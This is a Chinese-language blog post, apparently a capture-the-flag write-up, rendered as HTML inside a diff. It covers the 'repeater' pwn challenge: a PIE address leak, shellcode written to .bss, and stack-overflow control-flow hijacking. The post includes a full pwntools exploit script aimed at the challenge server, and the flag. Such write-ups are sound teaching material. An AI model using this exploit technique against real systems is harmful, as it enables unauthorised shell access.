@@ -1,32 +1,236 @@
-extends includes/layout.pug
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0"><title>攻防世界-repeater | Welcome to 4ss1du0us's Blog</title><meta name="author" content="4ss1du0us"><meta name="copyright" content="4ss1du0us"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="收获 &#x3D;&#x3D;IDA 中看到的地址是偏移地址&#x3D;&#x3D;，当开启了 PIE 地址随机化时，真实地址 &#x3D; 程序的基地址 + 偏移地址  &#x3D;&#x3D;可以直接向 .bss 段上写入 shellcode，再通过栈溢出去执行段上的 shellcode&#x3D;&#x3D;  &#x3D;&#x3D;开启 PIE 地址随机化后，程序执行过程中打印的地址就是">
+<meta property="og:type" content="article">
+<meta property="og:title" content="攻防世界-repeater">
+<meta property="og:url" content="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/index.html">
+<meta property="og:site_name" content="Welcome to 4ss1du0us&#39;s Blog">
+<meta property="og:description" content="收获 &#x3D;&#x3D;IDA 中看到的地址是偏移地址&#x3D;&#x3D;，当开启了 PIE 地址随机化时，真实地址 &#x3D; 程序的基地址 + 偏移地址  &#x3D;&#x3D;可以直接向 .bss 段上写入 shellcode，再通过栈溢出去执行段上的 shellcode&#x3D;&#x3D;  &#x3D;&#x3D;开启 PIE 地址随机化后，程序执行过程中打印的地址就是">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png">
+<meta property="article:published_time" content="2023-03-13T10:43:26.000Z">
+<meta property="article:modified_time" content="2023-03-13T11:10:27.828Z">
+<meta property="article:author" content="4ss1du0us">
+<meta property="article:tag" content="PWN">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png"><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"prismjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  }
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '攻防世界-repeater',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2023-03-13 19:10:27'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
 
-block content
-  #post
-    if top_img === false
-      include includes/header/post-info.pug
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
 
-    article#article-container.post-content!=page.content
-    include includes/post/post-copyright.pug
-    .tag_share
-      if (theme.post_meta.post.tags)
-        .post-meta__tag-list
-          each item, index in page.tags.data
-            a(href=url_for(item.path)).post-meta__tags #[=item.name]
-      include includes/third-party/share/index.pug
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
         
-    if theme.reward.enable && theme.reward.QR_code
-      !=partial('includes/post/reward', {}, {cache: true})
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><hr/></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a href="/" title="Welcome to 4ss1du0us's Blog"><span class="site-name">Welcome to 4ss1du0us's Blog</span></a></span><div id="menus"><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">攻防世界-repeater</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-03-13T10:43:26.000Z" title="发表于 2023-03-13 18:43:26">2023-03-13</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-03-13T11:10:27.828Z" title="更新于 2023-03-13 19:10:27">2023-03-13</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="攻防世界-repeater"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h2 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h2><ul>
+<li><p>&#x3D;&#x3D;IDA 中看到的地址是偏移地址&#x3D;&#x3D;，当开启了 <code>PIE</code> 地址随机化时，<strong>真实地址 &#x3D; 程序的基地址 + 偏移地址</strong></p>
+</li>
+<li><p>&#x3D;&#x3D;可以直接向 <code>.bss</code> 段上写入 <code>shellcode</code>，再通过栈溢出去执行段上的 <code>shellcode</code>&#x3D;&#x3D;</p>
+</li>
+<li><p>&#x3D;&#x3D;开启 <code>PIE</code> 地址随机化后，程序执行过程中打印的地址就是真实的地址&#x3D;&#x3D;</p>
+</li>
+</ul>
+<hr>
+<p><a target="_blank" rel="noopener" href="https://adworld.xctf.org.cn/media/file/task/ad96eacb-7944-4e2c-a5f1-0e9255c06639.zip">攻防世界-repeater</a></p>
+<hr>
+<h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><ol>
+<li><p>查看文件信息：<br>![[攻防世界-repeater1.png]]<br>64位 小端序，开启了 <code>PIE</code> 地址随机化</p>
+</li>
+<li><p>尝试运行：<br>![[攻防世界-repeater2.png]]<br>存在溢出</p>
+</li>
+<li><p>在 IDA 下分析：<br>![[攻防世界-repeater3.png]]<br>首先通过 <code>memset()</code> 函数将 <code>byte_202040</code> 的地址初始化，然后通过 <code>sub_982()</code> 函数将用户输入写到 <code>byte_202040</code> 地址处</p>
+</li>
+<li><p>查看 <code>byte_202040</code> 地址的位置：<br>![[攻防世界-repeater4.png]]<br>发现 <code>byte_202040</code> 是存储到 <code>.bss</code> 段上的<br>由于这个题的函数列表中没有给出 <code>system()</code> 函数，因此在 <code>.bss</code> 段上写入 <code>&quot;/bin/sh&quot;</code> 再通过 <code>system()</code> 函数来调用执行的方法是不行了；不过可以考虑在 <code>.bss</code> 段上写入 <code>shellcode</code>，让程序跳转到这里来执行 <code>shellcode</code></p>
+</li>
+<li><p>但是这个题&#x3D;&#x3D;开启了 <code>PIE</code> 地址随机化，因此在 IDA 中看到的地址并不是程序中真实的地址，而是偏移地址&#x3D;&#x3D;<br>所以即使将 <code>shellcode</code> 写入到 <code>0x202040</code> 的地址上，也并不知道 <code>shellcode</code> 在程序中存放的真实地址，需要先确定程序的基地址，就可以通过 <em><strong>真实地址 &#x3D; 基地址 + 偏移地址</strong></em> 计算出来</p>
+</li>
+<li><p>观察到 for 循环中会打印出 <code>main()</code> 函数的地址【<strong>这个是函数在程序中的真实地址</strong>】<br>![[攻防世界-repeater5.png]]<br>但是打印 <code>main()</code> 函数的地址需要 <code>v5 == 3281697</code>，而程序中定义的是 <code>v5 = 1192227</code><br>注意到还有一个 <code>read()</code> 函数进行输入，将输入存储到 <code>s</code> 中，输入的长度为 <code>0x40</code><br>查看 <code>s</code> 所在的位置：<br>![[攻防世界-repeater6.png]]<br>由于 <code>read()</code> 输入的长度是 <code>0x40</code>，而 <code>s</code> 在栈中的长度是 <code>0x20</code>，因此是可以溢出的</p>
+</li>
+<li><p>接下来思路就很明确了：<br> &#x3D;&#x3D;1. 在输入 <code>name</code> 的时候，由于是存储到 <code>.bss</code> 段上的，在这里写入一个 <code>shellcode</code></p>
+<ol start="2">
+<li>然后，通过 <code>read()</code> 函数进行栈溢出，一直覆盖到 <code>v5</code> 的位置，并将 <code>v5</code> 的值修改为 <code>3281697</code></li>
+<li>然后程序就会打印出 <code>main()</code> 函数的真实地址，将这个地址记录下来</li>
+<li>在 IDA 中找到 <code>main()</code> 函数的偏移地址，用 <code>main()</code> 函数的 <strong>真实地址 - 偏移地址 &#x3D; 程序的基地址</strong></li>
+<li>在 IDA 中找到 <code>shellcode</code> 存放的偏移地址，用 <code>shellcode</code> 的 <strong>偏移地址 + 程序的基地址 &#x3D; 真实地址</strong></li>
+<li>再次通过 <code>read()</code> 函数进行栈溢出，一直覆盖到函数返回的地方，将返回值修改为 <code>shellcode</code> 的真实地址</li>
+<li>程序跳转到 <code>shellcod</code>e 的地址去执行 <code>shellcode</code>，获得 shell&#x3D;&#x3D;</li>
+</ol>
+</li>
+</ol>
+<hr>
+<h2 id="脚本"><a href="#脚本" class="headerlink" title="脚本"></a>脚本</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
 
-    //- ad
-    if theme.ad && theme.ad.post
-      .ads-wrap!=theme.ad.post
+context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span>  <span class="token comment"># 打印调试信息</span>
+content <span class="token operator">=</span> <span class="token number">0</span>  <span class="token comment"># 本地Pwn通之后，将content改成0，Pwn远程端口</span>
 
-    if theme.post_pagination
-      include includes/pagination.pug
-    if theme.related_post && theme.related_post.enable
-      != related_posts(page,site.posts)
 
-    if page.comments !== false && theme.comments && theme.comments.use
-      - var commentsJsLoad = true
-      !=partial('includes/third-party/comments/index', {}, {cache: true})
-      
+<span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
+    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./repeater"</span><span class="token punctuation">)</span>  <span class="token comment"># 程序在kali的路径</span>
+    <span class="token keyword">else</span><span class="token punctuation">:</span>
+        io <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"61.147.171.105"</span><span class="token punctuation">,</span> <span class="token number">64526</span><span class="token punctuation">)</span>  <span class="token comment"># 题目的远程端口，注意是remote</span>
+
+    shellcode <span class="token operator">=</span> asm<span class="token punctuation">(</span>shellcraft<span class="token punctuation">.</span>sh<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>  <span class="token comment"># 构造shellcode</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"Please give me your name :\n"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span>  <span class="token comment"># name存储在.bss段上，通过这里的输入向.bss段上写入shellcode</span>
+
+    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x10</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">3281697</span><span class="token punctuation">)</span>  <span class="token comment"># 栈溢出修改v5的值为3281697</span>
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"But there is gift for you :\n"</span><span class="token punctuation">)</span>
+    main_addr <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"\n"</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">16</span><span class="token punctuation">)</span>  <span class="token comment"># 保存下程序打印出的main()的真实地址</span>
+    base_addr <span class="token operator">=</span> main_addr <span class="token operator">-</span> <span class="token number">0x0A33</span>  <span class="token comment"># 利用main()的真实地址计算出程序的基地址，0x0A33是main()的偏移地址，可以在ida中查看</span>
+    shellcode_addr <span class="token operator">=</span> base_addr <span class="token operator">+</span> <span class="token number">0x202040</span>  <span class="token comment"># 利用程序的基地址和写入的shellcode在.bss段上的偏移地址，计算出shellcode存放的真实地址</span>
+    <span class="token comment"># 0x202040是byte_202040在.bss段上的偏移地址，可以在ida中查看 </span>
+
+    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"input :"</span><span class="token punctuation">)</span>
+    payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token punctuation">(</span><span class="token number">0x30</span> <span class="token operator">-</span> <span class="token number">0x00</span> <span class="token operator">+</span> <span class="token number">0x08</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>shellcode_addr<span class="token punctuation">)</span>  <span class="token comment"># 再次通过栈溢出让程序跳转到shellcode的位置去执行</span>
+    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>
+
+    io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+
+
+main<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<hr>
+<h2 id="结果：cyberpeace-7165ca68103868530e16b6038318afc5"><a href="#结果：cyberpeace-7165ca68103868530e16b6038318afc5" class="headerlink" title="结果：cyberpeace{7165ca68103868530e16b6038318afc5}"></a>结果：cyberpeace{7165ca68103868530e16b6038318afc5}</h2><p>![[攻防世界-repeater7.png]]</p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="http://example.com">4ss1du0us</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/">http://example.com/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="http://example.com" target="_blank">Welcome to 4ss1du0us's Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/PWN/">PWN</a></div><div class="post_share"><div class="social-share" data-image="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime/" title="攻防世界-gametime"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">攻防世界-gametime</div></div></a></div><div class="next-post pull-right"><a href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/" title="攻防世界-int_overflow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">攻防世界-int_overflow</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/03/13/Pwntools/" title="Pwntools"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-13</div><div class="title">Pwntools</div></div></a></div><div><a href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/" title="攻防世界-int_overflow"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-03-13</div><div class="title">攻防世界-int_overflow</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://i.loli.net/2021/02/24/5O1day2nriDzjSu.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">4ss1du0us</div><div class="author-info__description"></div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">2</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/xxxxxx"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%94%B6%E8%8E%B7"><span class="toc-number">1.</span> <span class="toc-text">收获</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%80%9D%E8%B7%AF"><span class="toc-number">2.</span> <span class="toc-text">思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%84%9A%E6%9C%AC"><span class="toc-number">3.</span> <span class="toc-text">脚本</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%9C%EF%BC%9Acyberpeace-7165ca68103868530e16b6038318afc5"><span class="toc-number">4.</span> <span class="toc-text">结果：cyberpeace{7165ca68103868530e16b6038318afc5}</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/13/Pwntools/" title="Pwntools">Pwntools</a><time datetime="2023-03-13T11:36:07.000Z" title="发表于 2023-03-13 19:36:07">2023-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-gametime/" title="攻防世界-gametime">攻防世界-gametime</a><time datetime="2023-03-13T11:11:19.000Z" title="发表于 2023-03-13 19:11:19">2023-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-repeater/" title="攻防世界-repeater">攻防世界-repeater</a><time datetime="2023-03-13T10:43:26.000Z" title="发表于 2023-03-13 18:43:26">2023-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/13/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-int-overflow/" title="攻防世界-int_overflow">攻防世界-int_overflow</a><time datetime="2023-03-13T08:41:57.000Z" title="发表于 2023-03-13 16:41:57">2023-03-13</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/03/13/hello-world/" title="Hello World">Hello World</a><time datetime="2023-03-13T07:35:06.321Z" title="发表于 2023-03-13 15:35:06">2023-03-13</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2023 By 4ss1du0us</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
